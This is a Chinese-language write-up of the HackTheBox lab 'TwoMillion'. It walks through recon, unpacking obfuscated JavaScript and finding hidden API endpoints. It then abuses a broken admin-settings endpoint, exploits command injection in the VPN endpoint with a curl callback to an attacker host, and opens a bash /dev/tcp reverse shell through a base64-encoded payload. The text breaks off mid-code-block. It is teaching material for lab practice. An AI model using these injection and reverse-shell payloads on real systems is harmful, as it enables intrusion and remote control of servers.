# HTB TwoMillion 解題筆記

- 靶機 IP:`<TARGET_IP>`
- 網域:`2million.htb`
- 難度:Easy / Linux

---

## 第一階段總覽

```
nmap 掃描 → 發現 80 port 網站 → 設定 hosts
→ 網站有 invite 頁面 → 找到 inviteapi.min.js
→ 還原被打包的 JS → 找到隱藏的 API 路徑
→ ROT13 解碼拿到提示 → 呼叫 generate 取得 Base64 編碼的 code
→ Base64 解碼 → 通過 invite 驗證
```

---

## 1. 資訊蒐集(Recon)

### 指令

```bash
rustscan -a <TARGET_IP> -- -sCV -Pn -oA nmap
```

rustscan 先快速找出開放的 port,再把 `--` 之後的參數交給 nmap(輸出檔 `nmap.nmap` 檔頭顯示實際執行的是 `nmap -vvv -p 22,80 -4 -sCV -Pn -oA nmap`)。

輸出(`nmap.nmap`):

```
# Nmap 7.98 scan initiated Sun Nov 22 20:26:06 2026 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4 -sCV -Pn -oA nmap <TARGET_IP>
Nmap scan report for <TARGET_IP>
Host is up, received user-set (0.061s latency).
Scanned at 2026-11-22 20:26:09 CST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 22 20:26:17 2026 -- 1 IP address (1 host up) scanned in 11.08 seconds
```


### 各參數的意義

| 參數 | 意義 |
|---|---|
| `-Pn` | 不先 ping,直接當作主機在線(HTB 的 VPN 環境常會擋 ICMP) |
| `-4` | 只用 IPv4 |

### 結果

| Port | 服務 | 版本 |
|---|---|---|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx |

### 重要觀察

- 掃描結果寫著 `Did not follow redirect to http://2million.htb/`。
- **觀念**:網站用「虛擬主機(virtual host)」運作,伺服器靠 HTTP 的 `Host` 標頭判斷你要看哪個站。直接用 IP 連會被導向到網域名稱,但你的電腦不知道 `2million.htb` 是誰。

```bash
curl -I <TARGET_IP>
echo "<TARGET_IP> 2million.htb" | sudo tee -a /etc/hosts
```

  `tee -a` 是追加內容到檔案入。

---

## 2. 網站觀察

- 網站外觀很像舊版 HackTheBox。
- 點網站上的連結,找到 **invite 頁面**:要有 invite code 才能註冊。

---

## 3. 找出前端 JavaScript

在頁面原始碼裡看到:

```html
<script defer="" src="/js/inviteapi.min.js"></script>
```

- 檔名的 `.min` 代表壓縮(minified)過,讀起來很困難。
- 下載到本機:

```bash
curl -O http://2million.htb/js/inviteapi.min.js
```

  - `-O` 以遠端的檔名存檔(想自訂檔名用 `-o 檔名`;`-s` 靜默模式不顯示進度條)。

---

## 4. 排版與還原 JavaScript

### 4.1 排版(beautify)

壓縮過的 JS 通常只有一行,先排版方便閱讀:

```bash
sudo apt install node-js-beautify
js-beautify inviteapi.min.js > inviteapi.js
```

- `>` 是重新導向,把輸出存進檔案。

### 4.2 辨認出「打包(packed)」格式

排完版後,檔案開頭是:

```js
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```

這是 **Dean Edwards packer** 的特徵,原理:

1. 把程式碼裡反覆出現的單字換成短的代號(`1`、`4`、`9`...)。
2. 最後面那串用 `|` 分隔的清單,就是代號對照表。
3. 執行時,用 `eval` 把還原後的字串當作程式碼執行。

### 4.3 還原:把 `eval` 換成 `console.log`

**觀念**:`eval` 的作用是「執行一段字串」。如果把它換成 `console.log`,它就只會「印出」還原後的原始碼,**不會執行**。這是分析可疑 JS 時很實用的技巧。

```bash
sed 's/^eval(/console.log(/' inviteapi.js > unpack.js
node unpack.js | js-beautify
```

- `sed 's/舊/新/'`:文字替換。`^` 表示只匹配每行開頭。
- `node unpack.js`:用 Node.js 執行,印出還原後的程式碼。
- `| js-beautify`:管線(pipe)把輸出交給排版工具。

#### `node unpack.js` 

1. `inviteapi.js` 的結構是 `eval( 解包函式( '壓縮字串', ..., '單字清單' ) )`。
2. **解包函式**只做字串替換:把壓縮字串裡的代號(`1`、`4`、`9`…)依單字清單換回 `function`、`code`、`ajax` 等,**回傳一整串還原後的程式碼文字**。
3. 原本最外層的 `eval` 會把這串文字**當程式執行**。`sed` 把它換成 `console.log` 後,變成**把這串文字印出來**,不會執行。
4. `node unpack.js` 就是用 Node.js 跑這個檔案:解包函式照常跑(只是字串運算,安全),`console.log` 把結果印到螢幕。
5. 還原結果擠成一行,所以接 `| js-beautify` 排版。

原則:**只想讀不想跑**時,把「執行」的函式(`eval`、`Function`、`setTimeout(字串)`)換成「印出」的函式。但不熟的混淆程式不要直接用 `node` 跑,先看過內容再決定。

### 4.4 還原後的內容

輸出:

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```


### 重要發現

| 函式 | 路徑 | 用途 |
|---|---|---|
| `verifyInviteCode` | `/api/v1/invite/verify` | 驗證 code(頁面本來就會用到) |
| `makeInviteCode` | `/api/v1/invite/how/to/generate` | **前端沒有呼叫,但後端存在**的隱藏端點 |

**觀念**:前端程式碼裡常會留著頁面沒有用到的 API 路徑。讀前端 JS 時,要把「所有」函式與路徑列出來,而不是只看已經知道的那個。

---

## 5. 呼叫隱藏端點

### 注意:HTTP 方法

這個 API **只接受 POST**。用 GET 或 `-I`(HEAD)會被擋,得到 `301` 導向 `/404`,容易誤以為端點不存在。

**觀念**:

| curl 參數 | 作用 |
|---|---|
| `-I` | 發 HEAD 請求,只看標頭 |
| `-X POST` | 指定請求方法為 POST |
| `-s` | 靜默模式 |
| `-o 檔案` | 把回應存檔 |

早先試 GET 等其他方法時被禁止,這就是 API 對 HTTP 方法有限制的例子。

### 請求

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate -o generate.json
```

### 回應

回應(單行 JSON):

```
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

- `enctype` 欄位直接說明了加密方式:**ROT13**。

---

## 6. 處理 JSON 與 ROT13(重點)

### 6.1 用 jq 取出欄位

```bash
sudo apt install jq
jq . generate.json                      # 排版顯示整份 JSON
jq -r '.data.data' generate.json        # 取出 data 底下的 data 欄位
```

- `jq` 是命令列的 JSON 處理工具。
- `.data.data` 是路徑語法:先取 `data`,再取它裡面的 `data`。
- `-r`(raw)輸出純文字,不加引號與跳脫字元。


### 6.2 ROT13 是什麼

- 不是真正的加密,只是**字母替換**:每個字母往後移 13 位。
- 字母表有 26 個字母,移 13 位剛好一半,所以**編碼和解碼是同一個操作**。

### 6.3 用 tr 解碼

```bash
jq -r '.data.data' generate.json | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

- `tr` 把第一組字元逐一對應到第二組字元。
- 第一組 `A-Za-z`:所有大小寫字母。
- 第二組 `N-ZA-Mn-za-m`:大寫從 `N` 開始到 `Z`,再接 `A` 到 `M`;小寫同理。這正是旋轉 13 位後的字母表。

### 解碼結果

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

---

## 7. 取得並解碼 invite code

### 請求

```bash
curl http://2million.htb/api/v1/invite/generate -X POST
```


### 回應

```json
{"0":200,"success":1,"data":{"code":"WUdaSjktTVI2RlEtWFRYSkstM0M0T0k=","format":"encoded"}}
```

### 辨認編碼:Base64

特徵:

- 只有大小寫字母、數字(以及 `+`、`/`)。
- 結尾常有 `=` 作為補齊字元(padding)。

### 解碼

```bash
echo "WUdaSjktTVI2RlEtWFRYSkstM0M0T0k=" | base64 -d
# YGZJ9-MR6FQ-XTXJK-3C4OI
```

- `base64 -d`:解碼(decode)。

### 得到的 invite code

```
YGZJ9-MR6FQ-XTXJK-3C4OI
```

格式為五個字元一組、用 `-` 分隔,符合 invite code 的樣子。(每次呼叫 `generate` 可能產生不同的 code。)

---

## 8. 驗證 invite code

### 實際操作

在瀏覽器的 `/invite` 頁面輸入 code 並按下 Sign Up,驗證成功後被導向 `/register`。

### 等價的 curl 寫法

不經過頁面,直接對後端 API 發請求,效果相同:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/verify -d "code=YGZJ9-MR6FQ-XTXJK-3C4OI"
```

- `-d "code=..."`:以表單格式送出資料,欄位名稱 `code` 取自 `verifyInviteCode` 函式裡的 `formData`。

**結果:驗證成功,通過第一階段。**

### 觀念:`/invite` 是頁面,`/api/v1/invite/verify` 才是驗證邏輯

#### 三個角色

| 角色 | 做什麼 |
|---|---|
| `/invite`(頁面) | 伺服器回傳一份 HTML,只負責「畫」輸入框和按鈕 |
| 前端 JS(在瀏覽器裡跑) | 抓使用者輸入的 code,送給後端,再看後端回什麼 |
| `/api/v1/invite/verify`(後端 API) | **真正判斷 code 對不對的地方**(「判斷邏輯」指的就是這段後端程式碼) |

容易誤以為「按 Sign Up → 表單送到 `/invite` → `/invite` 自己去檢查」,實際流程:

```
1. 瀏覽器 ──GET /invite──▶ 伺服器        回傳 HTML 頁面(輸入框與按鈕)
2. 頁面載入 /js/inviteapi.min.js 與內嵌 JS
3. 按下 Sign Up → JS 攔截表單送出
4. 瀏覽器 ──POST /api/v1/invite/verify (code=...)──▶ 伺服器
5. 伺服器回傳 JSON(對或錯)→ JS 判斷結果,成功就跳轉 /register
```

#### 證據確認

```bash
curl -s http://2million.htb/invite | grep -iE '<form|<script|action=|method='
```

1. `grep -iE '<form|<script|action=|method='`:只留含有關鍵字的行。`-i` 不分大小寫,`-E` 讓 `|` 表示「或」。

四個關鍵字都是為了回答「按鈕按下去會送去哪」:

| 關鍵字 | 找什麼 |
|---|---|
| `<form` | 有沒有表單 |
| `action=` | 表單要送去的網址 |
| `method=` | 用 GET 還是 POST |
| `<script` | 載入了哪些 JS、有沒有內嵌 JS |

要驗證 JS 有沒有攔截表單,可再 grep:`grep -iE 'preventDefault|ajax|verify'`。

- 頁面有 `<form id="verifyForm" method="post">`,看起來會 POST 到 `/invite`。
- 但內嵌 JS 呼叫了 `e.preventDefault()`,**阻止表單預設送出**。
- 改用 `$.ajax` 對 `/api/v1/invite/verify` 發請求。
- 成功條件是回應 `data.message === "Invite code is valid!"`,然後把 code 存進 `localStorage`,跳轉到 `/register`。

#### `e.preventDefault()`:取消預設行為

瀏覽器對某些動作有內建反應:按表單送出鈕 → 把表單送到 `action` 網址並**整頁換成回應**;點連結 → 跳到網址。

```js
$("#verifyForm").on("submit", function(e) {
    e.preventDefault();   // 擋掉預設的送出
    // 接著自己用 $.ajax 送資料
});
```

- `submit`:表單送出時觸發的**事件**。
- `e`:事件物件(名字是慣例,寫 `event` 也行)。
- `.preventDefault()`:取消這次事件的預設行為。

看到 `<form method="post">` 不能直接判斷請求送去哪,要看 JS 有沒有攔截。

#### `$.ajax`:由 JS 在背景發請求,不換頁

| | 一般表單送出 | `$.ajax` |
|---|---|---|
| 誰發請求 | 瀏覽器自己 | JS 程式 |
| 結果怎麼處理 | 整個頁面換成回應內容 | 回應交給 JS 的函式處理 |
| 畫面 | 換頁 | 不動,只改 JS 想改的部分 |

| `$.ajax` 欄位 | 意思 |
|---|---|
| `type: "POST"` | 請求方法 |
| `url` | 發到哪個路徑 |
| `data: formData` | 帶什麼資料(`{"code": code}`) |
| `dataType: "json"` | 預期回來的是 JSON |
| `success` / `error` | 成功 / 失敗時要跑的函式 |

- 「背景」不代表看不到:DevTools 的 Network 分頁仍看得到每個 AJAX 請求。
- `$` 是 jQuery 函式庫;瀏覽器原生的寫法是 `fetch`。

#### 結論

| 項目 | 角色 |
|---|---|
| `/invite` | 網頁頁面,只負責「顯示」 |
| `/api/v1/invite/verify` | 後端 API,真正「檢查 code」 |
| 前端 JS | 負責送出請求與依結果跳轉,**不是驗證本身** |

檢查 code 的是後端,前端只是送出者。AJAX 請求就是普通的 HTTP 請求,攻擊者可以略過頁面,用 curl 發同樣的 POST,伺服器分辨不出差別(除非另外檢查 cookie 或標頭)。

---

## HTTP 方法、查詢參數與 PHP 的處理

### HTTP 請求的結構

```
POST /api/v1/invite/verify HTTP/1.1      ← 方法 + 路徑
Host: 2million.htb                        ← 標頭
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

code=XXXXX-XXXXX-XXXXX-XXXXX              ← body(資料)
```

| 方法 | 資料放哪 | 有 body 嗎 | 慣例上代表 |
|---|---|---|---|
| GET | 網址 `?key=value`(查詢參數) | 慣例上沒有 | 讀取 |
| HEAD | 同 GET,回應只給標頭 | 沒有 | 只看標頭 |
| **POST** | body | 有 | 新增、觸發動作 |
| **PUT** | body | 有 | 整份取代 |
| **PATCH** | body | 有 | 改部分欄位 |
| DELETE | 通常在網址 | 規格允許,不常見 | 刪除 |
| OPTIONS | 無 | 通常沒有 | 問允許哪些方法 |

- **POST、PUT、PATCH 的格式相同**(標頭 + 空行 + body),差別只在方法的「意義」。本題 `PUT settings/update` 的寫法跟 POST 一樣,只是 `-X PUT`。
- curl 的 `-d` 會帶 body,沒指定方法時預設用 POST;要 PUT 必須寫 `-X PUT`。
- 伺服器對方法是否嚴格由它自己決定:`how/to/generate` 只收 POST,`settings/update` 只收 PUT。

### GET 與 POST 的差異

| | GET | POST |
|---|---|---|
| 資料在 | 網址 | body |
| 留在哪 | 瀏覽器歷史、伺服器 access log、代理 log、Referer | body 通常不進 access log |
| 快取 / 書籤 | 可以 | 通常不行 |

- token、密碼放網址會洩漏到 log 和 Referer。

### 查詢參數不是 GET 專屬

查詢參數是**網址的一部分**,任何方法都可以帶:

```
POST /api/v1/invite/verify?code=AAA HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=BBB
```

網址有 `code=AAA`、body 有 `code=BBB`,採用哪個**由後端程式碼決定**。

### PHP Parameter

| 變數 | 內容 |
|---|---|
| `$_GET` | 網址的查詢參數 |
| `$_POST` | body 的參數,**只有** `application/x-www-form-urlencoded` 與 `multipart/form-data` 才會填入 |
| `$_REQUEST` | 合併 `$_GET`、`$_POST`(依設定可能含 `$_COOKIE`);同名時誰覆蓋誰由 `php.ini` 的 `request_order`(未設定時看 `variables_order`)決定 |
| `$_SERVER['REQUEST_METHOD']` | 這次請求的方法(`GET`、`POST`、`PUT`…) |
| `php://input` | 原始 body 字串 |

重點:

- **JSON body 不會進 `$_POST`**。程式要自己 `json_decode(file_get_contents('php://input'))`。
- **PUT 的 body 也不會進 `$_POST`**,同樣要讀 `php://input`。

### 做文章

1. **方法竄改**:同一路徑換 GET、POST、PUT、PATCH、DELETE、OPTIONS 全試一遍。權限檢查若只綁在某個方法上,換方法可能繞過。
2. **參數換位置**:body 的參數改放網址,或反過來。若後端也讀另一邊,可以用不同方法觸發原本限定方法的動作。
3. **參數污染**:網址和 body 放同名但不同值的參數,看後端取哪個。前端 / WAF 檢查的與後端使用的不同來源時,檢查會被繞過。
4. **同名重複**:`?a=1&a=2`,各後端取第一個、最後一個或組成陣列。
5. **Content-Type 切換**:form、JSON、XML 的驗證寬嚴可能不同(XML 還可能有 XXE)。
6. **方法覆寫**:`X-HTTP-Method-Override: PUT`、`_method=PUT`,可能繞過只擋 PUT / DELETE 的規則。
7. **CSRF**:若 GET 會改變資料,一張 `<img src="...">` 就能讓受害者的瀏覽器發出請求。

可以自己驗證:對 `/api/v1/invite/verify` 把正常的 `-d "code=..."` 改成 `-X POST "http://2million.htb/api/v1/invite/verify?code=..."`(不帶 body),看後端有沒有讀網址上的值。

---

## 如何探測一個 API 端點還能做什麼

端點的名稱(例如 `verify`)只代表它的「預期用途」,不代表它只能做這件事,也不能靠名字猜。要實際探測:

| 做法 | 說明 |
|---|---|
| 讀前端程式碼 | 前端怎麼呼叫、帶什麼參數,是最直接的線索。本題就是這樣找到 `how/to/generate` |
| 換 HTTP 方法 | 試 `GET`、`POST`、`PUT`、`DELETE`、`OPTIONS`,看哪些被接受。本題 API 只接受 `POST`。`OPTIONS` 有時會直接回傳允許的方法 |
| 看錯誤訊息 | 送空資料或欄位錯誤,伺服器常會說缺少哪個欄位 |
| 換參數、多帶參數 | 多送一個欄位看回應有沒有變化。可用 `arjun` 之類的工具找隱藏參數 |
| 找同一層的其他路徑 | 看 `/api/v1/invite/` 底下還有哪些端點 |
| 登入後再列舉 | 有些路徑未登入時回 404(像本題的 `/api/v1`),登入後才會顯示 |

觀念:**404 不一定代表不存在**,有些 API 在沒有身分時會假裝不存在。

### 本題的實例

- 前端 JS 洩漏了前端沒用到的 `how/to/generate`。
- 這個端點的回應自己帶了提示(`enctype`、`format` 欄位)。
- 用錯方法(`HEAD`、漏掉 `-X POST`)或 URL 寫錯(`//`)都會得到錯誤回應(`301` 導向 `/404`)。

---

## 第二階段:註冊登入與 API 列舉

### 9. 註冊並登入

- 在 `/register` 用 invite code 註冊帳號,登入。
- 登入後,session 存在 cookie `PHPSESSID` 裡。之後用 curl 要帶這個 cookie 才有身分。
- cookie 從瀏覽器 DevTools 的 Application(或 Storage)分頁 → Cookies 取得。

### 10. 用 curl 帶 cookie 讀取 API 路由列表

```bash
curl http://2million.htb/api/v1 --cookie "PHPSESSID=<PHPSESSID>"
```

- `--cookie "名稱=值"`:送出 cookie。
- 想看狀態碼與標頭可加 `-i`(`--show-headers`)。

#### 注意:未登入時 `/api/v1` 回 404

未登入請求 `/api/v1` 會得到 `301 → /404`;有些 API 在沒有身分時會假裝不存在。404 不一定代表不存在,可能是沒有身分。用 curl 排查比瀏覽器可靠,因為 curl 不會偷偷用快取。

### 11. 路由列表的內容

把回應存檔並排版:

```bash
curl http://2million.htb/api/v1 --cookie "PHPSESSID=<PHPSESSID>" -o api_v1.json
jq . api_v1.json
```

#### 回應(`jq . api_v1.json`)

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

#### 觀察

- 分成 `user` 與 `admin` 兩組,`admin` 是一般使用者不該碰的功能。
- `admin` 底下三個路徑用了三種 HTTP 方法(GET 讀取、POST 產生、PUT 修改)。
- 網站的 UI 沒有提供進入這些管理員功能的入口,但 **API 本身有沒有檢查權限**,必須實測才知道。

**觀念**:如果只有 UI 隱藏入口、API 沒有檢查權限,攻擊者可以跳過 UI,直接呼叫 API。這類問題叫**權限控管不當**(broken access control / broken function level authorization)。

### 12. jq 的 `.` 是什麼

`.` 是 jq 的「恆等過濾器」,代表目前整份資料,不做改動。`jq . 檔案` 就是把 JSON 原樣輸出並加上排版。

| 寫法 | 意思 |
|---|---|
| `.` | 整份資料 |
| `.data` | 取最外層的 `data` 欄位 |
| `.data.data` | 先取 `data`,再取它裡面的 `data` |
| `.v1.admin` | 取 `v1` 底下的 `admin` |
| `.["/api/v1/admin/auth"]` | 欄位名稱含有 `/` 等特殊字元時,用方括號與引號包起來 |

### 13. 檢查自己是不是管理員

```bash
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=<PHPSESSID>"
# {"message":false}
```

- `false` 代表目前帳號**不是管理員**。
- 觀察:這個端點是「回答你是不是管理員」,而不是「拒絕你查詢」。有檢查身分不代表**每個**管理員端點都有檢查,需要逐一實測。

---

## 第三階段:提升為管理員 → 指令注入 → 取得 shell

### 14. 用錯誤訊息一步步「問」出 API 要什麼

目標端點:`PUT /api/v1/admin/settings/update`(路由列表標的方法是 PUT)。
做法:**每次只修一個錯誤,讓伺服器自己告訴你缺什麼。**

```bash
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>"
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d "test"
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d 'email=<EMAIL>'
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d '{"email":"<EMAIL>"}'
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d '{"email":"<EMAIL>", "is_admin":"true"}'
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d '{"email":"<EMAIL>", "is_admin":"1"}'
curl http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<PHPSESSID>" -X PUT -H "Content-Type:application/json" -d '{"email":"<EMAIL>", "is_admin":1}'
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=<PHPSESSID>"
```

對應的伺服器回應:

| 順序 | 送的 | 伺服器回應 | 原因 / 修正 |
|---|---|---|---|
| 1 | 預設 GET | 空輸出 | 方法錯。空輸出不是沒回應,只是看不到,要加 `-i` |
| 2 | `-X PUT` | `Invalid content type.` | 缺 `Content-Type` 標頭 |
| 3 | `-H "Content-Type:application/json" -d "test"` | `Missing parameter: email` | 宣告了 JSON,內容就必須是 JSON |
| 4 | `-d 'email=<EMAIL>'` | 仍然 `Missing parameter: email` | `key=value` 是表單格式,伺服器照 JSON 解析不到 |
| 5 | `-d '{"email":"<EMAIL>"}'` | `Missing parameter: is_admin` | email 過了,換下一個缺的欄位 |
| 6 | `"is_admin":"true"` | `needs to be either 0 or 1` | 只接受 0 或 1 |
| 7 | `"is_admin":"1"` | 同上 | `"1"` 是字串,`1` 才是數字 |
| 8 | `"is_admin":1` | `{"id":<ID>,"username":"<USERNAME>","is_admin":1}` | 成功 |
| 9 | `GET /admin/auth` | `{"message":true}` | 驗證:原本是 `false` |

#### 觀念

- **Content-Type 要和內容一致**:標頭說 JSON,body 就要是 JSON。常見兩種格式:
  - 表單:`email=a@b.c&x=1`(`application/x-www-form-urlencoded`)
  - JSON:`{"email":"a@b.c","x":1}`(`application/json`)
- **JSON 語法**:鍵與值之間用 `:`(不是 `=`),字串用雙引號,數字/布林不加引號。
- **用單引號包 JSON**:`-d '{"a":"b"}'`,這樣裡面的雙引號不用跳脫。
- **錯誤訊息就是文件**:這個 API 每次都老實告訴你缺什麼、值該是什麼。遇到沒有文件的端點,送空請求、讀錯誤、修一個錯、再送,是很有效的探測方法。
- **驗證**:`GET /api/v1/admin/auth` 由 `{"message":false}` 變成 `{"message":true}`。

---

### 15. 管理員端點:`POST /api/v1/admin/vpn/generate`

升級後可以用的管理員功能。照第 14 節的方法探測:

```bash
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>"
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -X POST -i
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -X POST -i -H "Content-Type:application/json"
# {"status":"danger","message":"Missing parameter: username"}
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -X POST -i -H "Content-Type:application/json" -d '{"username":"<USERNAME>"}'
```

加上 `username` 後,伺服器回傳一整份 OpenVPN 設定檔(`.ovpn`,含私鑰與 tls-auth 金鑰)。

- 這份設定檔本身對提權**沒有用處**(靶機的已知岔路),有價值的是這個端點的**行為**。
- 思考:伺服器能依任意 `username` 即時產生憑證,後端很可能呼叫系統工具,並把 `username` 放進 shell 指令。這是**指令注入(Command Injection)** 的典型場景。

---

### 16. 確認指令注入

#### 方法:讓目標主動連回你(out-of-band)

1. 查自己的 `tun0` IP(HTB VPN 介面):`ip a show tun0`。
2. 開監聽:`sudo python3 -m http.server 80`(它會印出每個進來的請求)。
3. 注入一個無害指令讓目標連你:

   ```bash
   curl -X POST -i http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -H "Content-Type:application/json" -d '{"username":"<USERNAME>; $(curl http://<ATTACKER_IP>)"}'
   ```
4. 看到來自 `<TARGET_IP>` 的 `GET / HTTP/1.1`,就是目標**確實執行了你的指令**的直接證據。

#### 觀念

- `;` 結束原本的指令,接著執行你的指令;結尾再補一個 `;`,讓後面附加的內容不干擾你的指令。
- `$(cmd)` 是命令替換:先執行 `cmd`,把輸出放回原位。若只想「執行」,用 `;` 就夠了,不需要 `$()`。
- **先用簡單、無害的探針確認注入成立,再升級成反向 shell。** 這樣失敗時才知道是哪一層出問題。
- 沒開監聽器就送出,結果完全看不到,那次測試沒有意義,也不能當作「沒有注入」的證據。

---

### 17. 反向 shell

#### 原理

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

- `bash -i`:開互動式 bash。
- `>& /dev/tcp/IP/埠`:bash 的特殊功能,把輸出導向 TCP 連線(不是真的檔案)。
- `0>&1`:輸入也接到同一條連線。

先在你的機器開接收端:

```bash
nc -lvnp 4444     # -l 監聽 -v 詳細 -n 不解析 DNS -p 指定埠
```

#### 引號問題與 base64 解法

直接把 `bash -i >& ...` 塞進 JSON 會遇到兩個麻煩:

1. 外層單引號、內層又有單引號,字串提早結束,後面變成**你本機 zsh** 的指令。實際報錯:`zsh: no such file or directory: /dev/tcp/<ATTACKER_IP>/4444`。
2. `/dev/tcp` 是 **bash** 的功能,zsh 不支援,而且 `>&` 會被本機 zsh 當成重導向先處理。

解法:先編碼,目標端再解碼交給 bash。

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w0
# <BASE64_PAYLOAD>
```

(`-w0` 不換行;輸出結尾的 `%` 是 zsh 提示「沒有換行」,不是內容。)

引號衝突的實際失敗版本(內層單引號讓字串提早結束):

```bash
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -X POST -i -H "Content-Type:application/json" -d '{"username":"<USERNAME>; $(bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1')"}'
```

改用 base64(本機先開好 `nc -lvnp 4444`):

```bash
curl http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=<PHPSESSID>" -X POST -i -H "Content-Type:application/json" -d '{"username":"<USERNAME>; $(echo <BASE64_PAYLOAD> | base64 -d | bash)"}'
```

- 流程:`echo <base64>` → `base64 -d` 解碼 → `| bash` 交給 bash 執行。
- 編碼後 JSON 裡只剩英數字與 `+ / = | ;`,不再有引號衝突。
- 少了 `| base64 -d | bash`,只是把字串 echo 出來,不會有連線。

#### 結果

- `nc` 視窗出現 `connect to [<ATTACKER_IP>] from ... [<TARGET_IP>]`,拿到 `www-data@2million:~/html$`。
- 送出 curl 的那端會回 `504 Gateway Time-out`:反向 shell 一直連著,nginx 等不到 PHP 回應而逾時。這是**正常**的,甚至是成功的旁證。
- **`nc` 的視窗不要關**,關了 shell 就斷。

---

### 18. 升級 shell(選用)與踩過的坑

剛連進來的 shell 沒有 TTY(`no job control`),沒有 Tab 補全、方向鍵、`Ctrl+C` 會直接中斷連線。升級步驟,**順序不能錯**:

```bash
